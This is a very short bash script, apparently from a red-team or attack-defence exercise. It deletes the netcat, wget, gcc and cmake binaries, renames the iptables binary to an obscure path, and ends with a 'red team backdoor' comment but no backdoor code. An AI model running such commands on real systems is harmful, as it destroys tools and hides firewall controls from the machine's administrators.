#!/bin/bash
# remove gcc and other compilers
rm `which nc` `which wget` `which gcc` `which cmake`
mv `which xtables-multi` /sbin/yfa

# red team backdoor
